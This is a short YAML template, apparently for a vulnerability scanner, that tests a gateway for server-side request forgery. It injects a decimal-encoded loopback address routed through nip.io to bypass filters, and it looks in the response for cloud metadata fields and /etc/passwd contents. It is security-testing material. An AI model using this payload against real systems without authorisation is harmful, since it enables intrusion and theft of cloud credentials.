id: ssrf5-0095
name: 'SSRF probe in gateway'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via gateway (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      gateway:
        - 'http://2130706433.nip.io/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
